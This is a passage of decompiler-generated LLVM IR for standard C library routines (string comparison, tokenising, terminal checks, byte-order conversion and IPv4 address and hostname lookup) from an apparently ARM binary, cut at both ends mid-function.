  br label %dec_label_pc_143b0

dec_label_pc_1437c:                               ; preds = %dec_label_pc_14370, %entry
  %v3_14380 = ashr i32 %v0_14334, 31
  %v5_14394 = bitcast i32* %stack_var_-25 to i8*
  %v6_14394 = call i32 @_uintmaxtostr(i8* %v5_14394, i32 %v0_14334, i32 %v3_14380, i32 -10, i32 0)
  %v1_14398 = add i32 %v6_14394, -14
  store i32 %v1_14398, i32* @r5, align 4
  store i32 %v1_14398, i32* @r0, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_23f88.1114 to i32), i32* @r1, align 4
  store i32 14, i32* @r2, align 4
  %v0_143a8 = call i32 @memcpy()
  store i32 22, i32* %r7.global-to-local, align 4
  %v0_143b0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_143b0

dec_label_pc_143b0:                               ; preds = %bb26, %dec_label_pc_1437c
  %v0_143b0 = phi i32 [ %v0_1435c.lcssa55, %bb26 ], [ %v0_143b0.pre, %dec_label_pc_1437c ]
  %v1_143b0 = inttoptr i32 %v0_143b0 to i8*
  %v3_143b4 = call i32 @strlen(i8* %v1_143b0)
  %v0_143b8 = load i32, i32* @r8, align 4
  %v2_143b8 = icmp eq i32 %v0_143b8, 0
  %v1_143bc = add i32 %v3_143b4, 1
  store i32 %v1_143bc, i32* @r4, align 4
  br i1 %v2_143b8, label %bb27, label %dec_label_pc_143b0._crit_edge

dec_label_pc_143b0._crit_edge:                    ; preds = %dec_label_pc_143b0
  %v1_143c4.pre = load i32, i32* @r6, align 4
  br label %bb28

bb27:                                             ; preds = %dec_label_pc_143b0
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_143b0._crit_edge, %bb27
  %v4_143c8 = phi i32 [ %v1_143c4.pre, %dec_label_pc_143b0._crit_edge ], [ 0, %bb27 ]
  %tmp56 = icmp ugt i32 %v1_143bc, %v4_143c8
  br i1 %tmp56, label %bb29, label %.thread16

bb29:                                             ; preds = %bb28
  store i32 %v4_143c8, i32* @r4, align 4
  store i32 34, i32* %r7.global-to-local, align 4
  br label %.thread16

.thread16:                                        ; preds = %bb28, %bb29
  %v0_143d814 = phi i32 [ %v4_143c8, %bb29 ], [ %v1_143bc, %bb28 ]
  %v2_143d0 = icmp eq i32 %v0_143d814, 0
  br i1 %v2_143d0, label %dec_label_pc_143f4, label %dec_label_pc_143d8

dec_label_pc_143d8:                               ; preds = %.thread16
  store i32 %v0_143d814, i32* @r2, align 4
  %v0_143dc = load i32, i32* @r5, align 4
  store i32 %v0_143dc, i32* @r1, align 4
  store i32 %v0_143b8, i32* @r0, align 4
  %v0_143e4 = call i32 @memcpy()
  %v0_143e8 = load i32, i32* @r8, align 4
  %v1_143e8 = load i32, i32* @r4, align 4
  %v2_143e8 = add i32 %v1_143e8, %v0_143e8
  %v3_143f0 = add i32 %v2_143e8, -1
  %v4_143f0 = inttoptr i32 %v3_143f0 to i8*
  store i8 0, i8* %v4_143f0, align 1
  br label %dec_label_pc_143f4

dec_label_pc_143f4:                               ; preds = %.thread16, %dec_label_pc_143d8
  %v0_143f4 = load i32, i32* %r7.global-to-local, align 4
  %v2_143f4 = icmp eq i32 %v0_143f4, 0
  br i1 %v2_143f4, label %dec_label_pc_14404, label %dec_label_pc_143fc

dec_label_pc_143fc:                               ; preds = %dec_label_pc_143f4
  %v0_143fc = call i32 @__errno_location()
  %v0_14400 = load i32, i32* %r7.global-to-local, align 4
  %v2_14400 = inttoptr i32 %v0_143fc to i32*
  store i32 %v0_14400, i32* %v2_14400, align 4
  %v0_14404.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14404

dec_label_pc_14404:                               ; preds = %dec_label_pc_143f4, %dec_label_pc_143fc
  %v0_14404 = phi i32 [ 0, %dec_label_pc_143f4 ], [ %v0_14404.pre, %dec_label_pc_143fc ]
  store i32 %v3_14330, i32* @r4, align 4
  ret i32 %v0_14404

; uselistorder directives
  uselistorder i32 %v4_143c8, { 1, 2, 0 }
  uselistorder i32 %v1_143bc, { 1, 0, 2 }
  uselistorder i32 %v1_1435c, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_14334, { 4, 3, 1, 2, 0 }
  uselistorder i32* %r7.global-to-local, { 2, 4, 3, 0, 1, 5 }
  uselistorder label %dec_label_pc_14404, { 1, 0 }
  uselistorder label %dec_label_pc_143f4, { 1, 0 }
  uselistorder label %.thread16, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %dec_label_pc_143b0, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @lr, align 4
  br label %dec_label_pc_14428

dec_label_pc_14428:                               ; preds = %bb8, %entry
  %v8_1448c3 = phi i32 [ %v8_1448c, %bb8 ], [ 0, %entry ]
  %v0_14480 = phi i32 [ %v1_14480, %bb8 ], [ %arg2, %entry ]
  %v0_14484 = phi i32 [ %v1_14484, %bb8 ], [ %tmp, %entry ]
  %v9_14428 = icmp eq i32 %v0_14484, %v0_14480
  br i1 %v9_14428, label %dec_label_pc_14428._crit_edge, label %dec_label_pc_14430

dec_label_pc_14428._crit_edge:                    ; preds = %dec_label_pc_14428
  %.pre = inttoptr i32 %v0_14480 to i8*
  br label %bb8

dec_label_pc_14430:                               ; preds = %dec_label_pc_14428
  %v1_14434 = inttoptr i32 %v0_14484 to i8*
  %v2_14434 = load i8, i8* %v1_14434, align 1
  %v3_14434 = zext i8 %v2_14434 to i32
  %v1_14438 = inttoptr i32 %v0_14480 to i8*
  %v2_14438 = load i8, i8* %v1_14438, align 1
  %v3_14438 = zext i8 %v2_14438 to i32
  %v2_1443c = load i32, i32* bitcast (i32** @global_var_2d5c4.1118 to i32*), align 4
  %v2_14440 = mul nuw nsw i32 %v3_14434, 2
  %v2_14444 = mul nuw nsw i32 %v3_14438, 2
  %v2_14448 = add i32 %v2_14444, %v2_1443c
  %v2_1444c = add i32 %v2_1443c, %v2_14440
  %v1_14450 = add i32 %v2_1444c, 1
  %v2_14450 = inttoptr i32 %v1_14450 to i8*
  %v3_14450 = load i8, i8* %v2_14450, align 1
  %v4_14450 = zext i8 %v3_14450 to i32
  %v1_14454 = add i32 %v2_14448, 1
  %v2_14454 = inttoptr i32 %v1_14454 to i8*
  %v3_14454 = load i8, i8* %v2_14454, align 1
  %v4_14454 = zext i8 %v3_14454 to i32
  %v3_14458 = inttoptr i32 %v2_14448 to i8*
  %v4_14458 = load i8, i8* %v3_14458, align 1
  %v6_14458 = zext i8 %v4_14458 to i32
  %v3_1445c = inttoptr i32 %v2_1444c to i8*
  %v4_1445c = load i8, i8* %v3_1445c, align 1
  %v6_1445c = zext i8 %v4_1445c to i32
  %v3_14460 = mul nuw i32 %v4_14454, 16777216
  %v3_14464 = mul nuw i32 %v4_14450, 16777216
  %v4_14468 = sdiv i32 %v3_14464, 65536
  %v5_14468 = or i32 %v6_1445c, %v4_14468
  %v4_1446c = sdiv i32 %v3_14460, 65536
  %v5_1446c = or i32 %v4_1446c, %v6_14458
  %v2_14470 = sub nsw i32 %v5_14468, %v5_1446c
  %v9_14470 = icmp eq i32 %v5_14468, %v5_1446c
  br i1 %v9_14470, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_14430
  ret i32 %v2_14470

bb8:                                              ; preds = %dec_label_pc_14428._crit_edge, %dec_label_pc_14430
  %v1_14478.pre-phi = phi i8* [ %.pre, %dec_label_pc_14428._crit_edge ], [ %v1_14434, %dec_label_pc_14430 ]
  %v8_1448c = phi i32 [ %v8_1448c3, %dec_label_pc_14428._crit_edge ], [ %v2_14470, %dec_label_pc_14430 ]
  %v2_14478 = load i8, i8* %v1_14478.pre-phi, align 1
  %v2_1447c = icmp eq i8 %v2_14478, 0
  %v1_14480 = add i32 %v0_14480, 1
  %v1_14484 = add i32 %v0_14484, 1
  store i32 %v1_14484, i32* @lr, align 4
  br i1 %v2_1447c, label %dec_label_pc_1448c, label %dec_label_pc_14428

dec_label_pc_1448c:                               ; preds = %bb8
  ret i32 %v8_1448c

; uselistorder directives
  uselistorder i32 %v1_14484, { 1, 0 }
  uselistorder i32 %v2_14470, { 1, 0 }
  uselistorder i32 %v5_1446c, { 1, 0 }
  uselistorder i32 %v5_14468, { 1, 0 }
  uselistorder i32 %v0_14480, { 1, 2, 0, 3 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @strcasestr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v1_144a816 = inttoptr i32 %arg2 to i8*
  br label %dec_label_pc_144a8.outer

dec_label_pc_144a8.outer:                         ; preds = %dec_label_pc_14510, %entry
  %v0_144bc.ph = phi i32 [ %v1_14510, %dec_label_pc_14510 ], [ %tmp, %entry ]
  %v2_144a817 = load i8, i8* %v1_144a816, align 1
  %v2_144ac19 = icmp eq i8 %v2_144a817, 0
  br i1 %v2_144ac19, label %dec_label_pc_144bc, label %dec_label_pc_144c4

dec_label_pc_144bc:                               ; preds = %dec_label_pc_144a8.backedge, %dec_label_pc_144a8.outer
  ret i32 %v0_144bc.ph

dec_label_pc_144c4:                               ; preds = %dec_label_pc_144a8.outer, %dec_label_pc_144a8.backedge
  %v1_144b425.in = phi i32 [ %v1_144b425, %dec_label_pc_144a8.backedge ], [ %arg2, %dec_label_pc_144a8.outer ]
  %v2_144a823 = phi i8 [ %v2_144a8, %dec_label_pc_144a8.backedge ], [ %v2_144a817, %dec_label_pc_144a8.outer ]
  %v2_144b024.in.in = phi i8 [ %v2_144a8, %dec_label_pc_144a8.backedge ], [ %v2_144a817, %dec_label_pc_144a8.outer ]
  %v0_144cc22 = phi i32 [ %v1_144cc, %dec_label_pc_144a8.backedge ], [ %v0_144bc.ph, %dec_label_pc_144a8.outer ]
  %v1_144b425 = add i32 %v1_144b425.in, 1
  %v1_144c4 = inttoptr i32 %v0_144cc22 to i8*
  %v2_144c4 = load i8, i8* %v1_144c4, align 1
  %v9_144c8 = icmp eq i8 %v2_144a823, %v2_144c4
  %v1_144cc = add i32 %v0_144cc22, 1
  br i1 %v9_144c8, label %dec_label_pc_144a8.backedge, label %dec_label_pc_144d8

dec_label_pc_144a8.backedge:                      ; preds = %dec_label_pc_144c4, %dec_label_pc_144d8
  %v1_144a8 = inttoptr i32 %v1_144b425 to i8*
  %v2_144a8 = load i8, i8* %v1_144a8, align 1
  %v2_144ac = icmp eq i8 %v2_144a8, 0
  br i1 %v2_144ac, label %dec_label_pc_144bc, label %dec_label_pc_144c4

dec_label_pc_144d8:                               ; preds = %dec_label_pc_144c4
  %v2_144b024.in = zext i8 %v2_144b024.in.in to i32
  %v3_144c4 = zext i8 %v2_144c4 to i32
  %v2_144d0 = mul nuw nsw i32 %v3_144c4, 2
  %v2_144b024 = mul nuw nsw i32 %v2_144b024.in, 2
  %v2_144dc = load i32, i32* bitcast (i32** @global_var_2d5c4.1118 to i32*), align 4
  %v2_144e0 = add i32 %v2_144dc, %v2_144d0
  %v2_144e4 = add i32 %v2_144dc, %v2_144b024
  %v1_144e8 = add i32 %v2_144e4, 1
  %v2_144e8 = inttoptr i32 %v1_144e8 to i8*
  %v3_144e8 = load i8, i8* %v2_144e8, align 1
  %v4_144e8 = zext i8 %v3_144e8 to i32
  %v1_144ec = add i32 %v2_144e0, 1
  %v2_144ec = inttoptr i32 %v1_144ec to i8*
  %v3_144ec = load i8, i8* %v2_144ec, align 1
  %v4_144ec = zext i8 %v3_144ec to i32
  %v3_144f0 = inttoptr i32 %v2_144e0 to i8*
  %v4_144f0 = load i8, i8* %v3_144f0, align 1
  %v6_144f0 = zext i8 %v4_144f0 to i32
  %v3_144f4 = inttoptr i32 %v2_144e4 to i8*
  %v4_144f4 = load i8, i8* %v3_144f4, align 1
  %v6_144f4 = zext i8 %v4_144f4 to i32
  %v3_144f8 = mul nuw i32 %v4_144e8, 16777216
  %v3_144fc = mul nuw i32 %v4_144ec, 16777216
  %v4_14500 = sdiv i32 %v3_144f8, 65536
  %v5_14500 = or i32 %v6_144f4, %v4_14500
  %v4_14504 = sdiv i32 %v3_144fc, 65536
  %v5_14504 = or i32 %v4_14504, %v6_144f0
  %v9_14508 = icmp eq i32 %v5_14500, %v5_14504
  br i1 %v9_14508, label %dec_label_pc_144a8.backedge, label %dec_label_pc_14510

dec_label_pc_14510:                               ; preds = %dec_label_pc_144d8
  %v1_14510 = add i32 %v0_144bc.ph, 1
  %v2_14514 = icmp eq i8 %v2_144c4, 0
  br i1 %v2_14514, label %dec_label_pc_14524, label %dec_label_pc_144a8.outer

dec_label_pc_14524:                               ; preds = %dec_label_pc_14510
  ret i32 0

; uselistorder directives
  uselistorder i8 %v2_144a8, { 2, 1, 0 }
  uselistorder i8 %v2_144c4, { 0, 2, 1 }
  uselistorder i32 %v0_144cc22, { 1, 0 }
  uselistorder i32 %v0_144bc.ph, { 2, 0, 1 }
  uselistorder label %dec_label_pc_144a8.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_144c4, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_3362c.1121 to i32), i32* @r2, align 4
  %v0_14534 = call i32 @strtok_r()
  %v0_14538 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14538, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v0_14534

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-64 = alloca i32, align 4
  %v2_14540 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_14540, i32* @r1, align 4
  %v0_14548 = call i32 @__GI_tcgetattr()
  %v1_1454c = sub i32 1, %v0_14548
  %v2_1454c = icmp ult i32 %v0_14548, 2
  br i1 %v2_1454c, label %bb4, label %bb

bb:                                               ; preds = %entry
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v5_14558 = phi i32 [ %v1_1454c, %entry ], [ 0, %bb ]
  ret i32 %v5_14558

; uselistorder directives
  uselistorder i32 %v0_14548, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_2()
  %stack_var_-39 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_1455c = load i32, i32* @r4, align 4
  %v6_1455c = load i32, i32* @r5, align 4
  %v2_14560 = ptrtoint i32* %stack_var_-56 to i32
  %v0_14564 = load i32, i32* @r1, align 4
  store i32 %v0_14564, i32* %r6.global-to-local, align 4
  %v0_14570 = load i32, i32* @r0, align 4
  %v3_14570 = call i32 @ioctl(i32 %v0_14570, i32 21505, i32 %v2_14560)
  store i32 %v3_14570, i32* %r7.global-to-local, align 4
  %v2_14574 = icmp eq i32 %v3_14570, 0
  %v2_1457c = ptrtoint i32* %stack_var_-39 to i32
  store i32 %v2_1457c, i32* @r1, align 4
  %v0_14584 = load i32, i32* %r6.global-to-local, align 4
  br i1 %v2_14574, label %dec_label_pc_1458c, label %dec_label_pc_145b8

dec_label_pc_1458c:                               ; preds = %entry
  %v1_14584 = add i32 %v0_14584, 17
  %v4_14594 = zext i8 %tmp to i32
  store i32 %v4_14594, i32* @r5, align 4
  %v2_14598 = load i32, i32* %stack_var_-56, align 4
  %v1_1459c = inttoptr i32 %v0_14584 to i32*
  store i32 %v2_14598, i32* %v1_1459c, align 4
  %v3_1459c = add i32 %v0_14584, 4
  %v4_1459c = inttoptr i32 %v3_1459c to i32*
  %v5_1459c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_1459c, i32* %v4_1459c, align 4
  %v6_1459c = add i32 %v0_14584, 8
  %v7_1459c = inttoptr i32 %v6_1459c to i32*
  %v8_1459c = load i32, i32* @lr, align 4
  store i32 %v8_1459c, i32* %v7_1459c, align 4
  %v0_145a0 = load i32, i32* @r4, align 4
  %v1_145a0 = load i32, i32* %r6.global-to-local, align 4
  %v2_145a0 = add i32 %v1_145a0, 12
  %v3_145a0 = inttoptr i32 %v2_145a0 to i32*
  store i32 %v0_145a0, i32* %v3_145a0, align 4
  %v0_145a4 = load i32, i32* @r5, align 4
  %v1_145a4 = trunc i32 %v0_145a4 to i8
  %v2_145a4 = load i32, i32* %r6.global-to-local, align 4
  %v3_145a4 = add i32 %v2_145a4, 16
  %v4_145a4 = inttoptr i32 %v3_145a4 to i8*
  store i8 %v1_145a4, i8* %v4_145a4, align 1
  %v4_145a8 = call i32 @__GI_mempcpy(i32 %v1_14584, i32 %v2_1457c, i32 19, i32 %v2_14598)
  %v0_145ac = load i32, i32* %r7.global-to-local, align 4
  store i32 13, i32* @r2, align 4
  %v2_145b4 = inttoptr i32 %v4_145a8 to i8*
  %v3_145b4 = call i32 @__GI_memset(i8* %v2_145b4, i32 %v0_145ac)
  br label %dec_label_pc_145b8

dec_label_pc_145b8:                               ; preds = %entry, %dec_label_pc_1458c
  %v0_145b8 = phi i32 [ %v3_14570, %entry ], [ %v0_145ac, %dec_label_pc_1458c ]
  store i32 %v3_1455c, i32* @r4, align 4
  store i32 %v6_1455c, i32* @r5, align 4
  ret i32 %v0_145b8

; uselistorder directives
  uselistorder i32 %v0_14584, { 2, 1, 0, 3 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 0, 2, 1 }
  uselistorder label %dec_label_pc_145b8, { 1, 0 }
}

define i32 @ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v2_145e4 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v2_145e4
}

define i32 @ntohs(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = mul i32 %arg1, 256
  %v1_145f4 = and i32 %tmp, 65280
  %tmp1 = udiv i32 %arg1, 256
  %v4_145f8 = urem i32 %tmp1, 256
  %v5_145f8 = or i32 %v4_145f8, %v1_145f4
  ret i32 %v5_145f8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v2_1461c = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v2_1461c
}

define i32 @htons(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = mul i32 %arg1, 256
  %v1_1462c = and i32 %tmp, 65280
  %tmp1 = udiv i32 %arg1, 256
  %v4_14630 = urem i32 %tmp1, 256
  %v5_14630 = or i32 %v4_14630, %v1_1462c
  ret i32 %v5_14630

; uselistorder directives
  uselistorder i32 65280, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__GI_inet_ntoa_r() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %v3_14638 = load i32, i32* @r4, align 4
  %v6_14638 = load i32, i32* @r5, align 4
  %v9_14638 = load i32, i32* @r6, align 4
  %v0_1463c = load i32, i32* @r0, align 4
  %v2_1465c = call i32 @llvm.bswap.i32(i32 %v0_1463c)
  %v0_14660 = load i32, i32* @r1, align 4
  %v1_14660 = add i32 %v0_14660, 15
  store i32 %v1_14660, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1468c

dec_label_pc_1466c:                               ; preds = %dec_label_pc_1468c
  %v1_14690 = urem i32 %v0_146a0, 256
  store i32 0, i32* %ip.global-to-local, align 4
  %v5_14674 = inttoptr i32 %v0_146ac to i8*
  %v6_14674 = call i32 @_uintmaxtostr(i8* %v5_14674, i32 %v1_14690, i32 0, i32 -10, i32 0)
  %v0_14678 = load i32, i32* @r6, align 4
  %v2_14678 = icmp eq i32 %v0_14678, 0
  %v1_1467c = add i32 %v6_14674, -1
  store i32 %v1_1467c, i32* %ip.global-to-local, align 4
  br i1 %v2_14678, label %dec_label_pc_1468c.backedge, label %bb

dec_label_pc_1468c.backedge:                      ; preds = %bb, %dec_label_pc_1466c
  %storemerge.pre = phi i32 [ %storemerge.pre.pre, %bb ], [ %v1_1467c, %dec_label_pc_1466c ]
  %v0_1468c.pre = load i32, i32* @r5, align 4
  %v0_14690.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1468c

bb:                                               ; preds = %dec_label_pc_1466c
  %v4_14684 = inttoptr i32 %v0_14678 to i8*
  store i8 46, i8* %v4_14684, align 1
  %storemerge.pre.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1468c.backedge

dec_label_pc_1468c:                               ; preds = %dec_label_pc_1468c.backedge, %entry
  %v0_146ac = phi i32 [ %v1_14660, %entry ], [ %storemerge.pre, %dec_label_pc_1468c.backedge ]
  %storemerge = phi i32 [ 0, %entry ], [ %storemerge.pre, %dec_label_pc_1468c.backedge ]
  %v0_146a0 = phi i32 [ %v2_1465c, %entry ], [ %v0_14690.pre, %dec_label_pc_1468c.backedge ]
  %v0_146a4 = phi i32 [ 0, %entry ], [ %v0_1468c.pre, %dec_label_pc_1468c.backedge ]
  store i32 %storemerge, i32* @r6, align 4
  %v7_1468c = icmp eq i32 %v0_146a4, 3
  store i1 %v7_1468c, i1* @cpsr_z, align 1
  %v3_146a0 = udiv i32 %v0_146a0, 256
  store i32 %v3_146a0, i32* @r4, align 4
  %v1_146a4 = add i32 %v0_146a4, 1
  store i32 %v1_146a4, i32* @r5, align 4
  %v7_146a8 = icmp sgt i32 %v0_146a4, 3
  br i1 %v7_146a8, label %dec_label_pc_146ac, label %dec_label_pc_1466c

dec_label_pc_146ac:                               ; preds = %dec_label_pc_1468c
  %v1_146ac = add i32 %v0_146ac, 1
  store i32 %v3_14638, i32* @r4, align 4
  store i32 %v6_14638, i32* @r5, align 4
  store i32 %v9_14638, i32* @r6, align 4
  ret i32 %v1_146ac

; uselistorder directives
  uselistorder i32 %v0_146a4, { 2, 0, 1 }
  uselistorder i32 (i8*, i32, i32, i32, i32)* @_uintmaxtostr, { 2, 1, 0 }
}

define i32 @__GI_inet_ntoa(i32 %arg1) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_33630.1124 to i32), i32* @r1, align 4
  %v0_146bc = call i32 @__GI_inet_ntoa_r()
  %v0_146c0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_146c0, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v0_146bc

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_146c8 = ptrtoint i32* %stack_var_-8 to i32
  %v0_146d0 = load i32, i32* @r0, align 4
  %v2_146d0 = inttoptr i32 %v0_146d0 to i8*
  %v3_146d0 = call i32 @inet_aton(i8* %v2_146d0, i32 %v2_146c8)
  %v2_146d4 = icmp eq i32 %v3_146d0, 0
  br i1 %v2_146d4, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v3_146dc = load i32, i32* %stack_var_-8, align 4
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v5_146e4 = phi i32 [ -1, %entry ], [ %v3_146dc, %bb ]
  ret i32 %v5_146e4

; uselistorder directives
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_146e8 = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_146f4 = call i32 @__GI___h_errno_location()
  %v2_146f8 = ptrtoint i32* %stack_var_-12 to i32
  %v0_14704 = load i32, i32* @r4, align 4
  %v7_14714 = call i32 @gethostbyname_r(i32 %v0_14704, i32* nonnull @global_var_3380c.1126, i32 ptrtoint (i32* @global_var_33640.1128 to i32), i32 460, i32 %v2_146f8, i32 %v0_146f4)
  %v3_14718 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_146e8, i32* @r4, align 4
  ret i32 %v3_14718
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v6_1472c = load i32, i32* @r5, align 4
  %v9_1472c = load i32, i32* @r6, align 4
  %v12_1472c = load i32, i32* @r7, align 4
  %v15_1472c = load i32, i32* @r8, align 4
  %v18_1472c = load i32, i32* @sb, align 4
  %v21_1472c = load i32, i32* @sl, align 4
  %v24_1472c = load i32, i32* @fp, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  %v0_1473c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1473c, i32* @fp, align 4
  %v2_1473c = icmp eq i32 %v0_1473c, 0
  store i32 0, i32* @r6, align 4
  store i32 %tmp, i32* @sl, align 4
  store i32 %arg4, i32* @r4, align 4
  %v2_1474c = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v2_1474c, align 4
  br i1 %v2_1473c, label %bb, label %dec_label_pc_14758

bb:                                               ; preds = %entry
  %v1_14750 = load i32, i32* %r0.global-to-local, align 4
  %v2_14750 = add i32 %v1_14750, 22
  store i32 %v2_14750, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14a7c

dec_label_pc_14758:                               ; preds = %entry
  %v0_14758 = call i32 @__errno_location()
  store i32 %v0_14758, i32* %r0.global-to-local, align 4
  %v3_1475c = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1475c, i32* %ip.global-to-local, align 4
  %v1_14760 = inttoptr i32 %v0_14758 to i32*
  %v2_14760 = load i32, i32* %v1_14760, align 4
  store i32 %v2_14760, i32* @r8, align 4
  %v0_14764 = load i32, i32* @r6, align 4
  store i32 %v0_14764, i32* %v1_14760, align 4
  %v0_14768 = load i32, i32* %ip.global-to-local, align 4
  store i32 %arg6, i32* %ip.global-to-local, align 4
  store i32 %v0_14758, i32* @r5, align 4
  %v0_14778 = load i32, i32* @fp, align 4
  store i32 %v0_14778, i32* %r0.global-to-local, align 4
  %v0_1477c = load i32, i32* @sl, align 4
  store i32 %v0_1477c, i32* %r2.global-to-local, align 4
  %v0_14780 = load i32, i32* @r7, align 4
  store i32 %v0_14780, i32* %r3.global-to-local, align 4
  %v0_14784 = load i32, i32* @r4, align 4
  %v7_1478c = call i32 @__get_hosts_byname_r(i32 %v0_14778, i32 2, i32 %v0_1477c, i32 %v0_14780, i32 %v0_14784, i32 %v0_14768, i32 %arg6)
  store i32 %v7_1478c, i32* %r0.global-to-local, align 4
  %v2_14790 = icmp eq i32 %v7_1478c, 0
  br i1 %v2_14790, label %dec_label_pc_14a7c, label %dec_label_pc_14798

dec_label_pc_14798:                               ; preds = %dec_label_pc_14758
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v1_1479c = inttoptr i32 %arg6 to i32*
  %v2_1479c = load i32, i32* %v1_1479c, align 4
  store i32 %v2_1479c, i32* %r3.global-to-local, align 4
  %v7_147a0 = icmp eq i32 %v2_1479c, 1
  br i1 %v7_147a0, label %dec_label_pc_147c4, label %dec_label_pc_147a8

dec_label_pc_147a8:                               ; preds = %dec_label_pc_14798
  %v7_147a8 = icmp eq i32 %v2_1479c, 4
  br i1 %v7_147a8, label %dec_label_pc_147c4, label %dec_label_pc_147b0

dec_label_pc_147b0:                               ; preds = %dec_label_pc_147a8
  %v3_147b0 = icmp eq i32 %v2_1479c, -1
  br i1 %v3_147b0, label %dec_label_pc_147b8, label %dec_label_pc_14a7c

dec_label_pc_147b8:                               ; preds = %dec_label_pc_147b0
  %v0_147b8 = load i32, i32* @r5, align 4
  %v1_147b8 = inttoptr i32 %v0_147b8 to i32*
  %v2_147b8 = load i32, i32* %v1_147b8, align 4
  store i32 %v2_147b8, i32* %r3.global-to-local, align 4
  %v7_147bc = icmp eq i32 %v2_147b8, 2
  br i1 %v7_147bc, label %dec_label_pc_147c4, label %dec_label_pc_14a7c

dec_label_pc_147c4:                               ; preds = %dec_label_pc_147b8, %dec_label_pc_147a8, %dec_label_pc_14798
  %v0_147c4 = load i32, i32* @r7, align 4
  %v1_147c4 = sub i32 0, %v0_147c4
  %v1_147c8 = urem i32 %v1_147c4, 4
  store i32 %v1_147c8, i32* %r3.global-to-local, align 4
  %v2_147c8 = icmp eq i32 %v1_147c8, 0
  %v0_147cc = load i32, i32* @r8, align 4
  %v1_147cc = load i32, i32* @r5, align 4
  %v2_147cc = inttoptr i32 %v1_147cc to i32*
  store i32 %v0_147cc, i32* %v2_147cc, align 4
  %v0_147ec.pre = load i32, i32* @r4, align 4
  br i1 %v2_147c8, label %dec_label_pc_147e4, label %dec_label_pc_147d4

dec_label_pc_147d4:                               ; preds = %dec_label_pc_147c4
  %v1_147d4 = load i32, i32* %r3.global-to-local, align 4
  %v2_147d4 = sub i32 %v0_147ec.pre, %v1_147d4
  %v3_147d4 = icmp ult i32 %v0_147ec.pre, %v1_147d4
  br i1 %v3_147d4, label %dec_label_pc_14a78, label %dec_label_pc_147dc

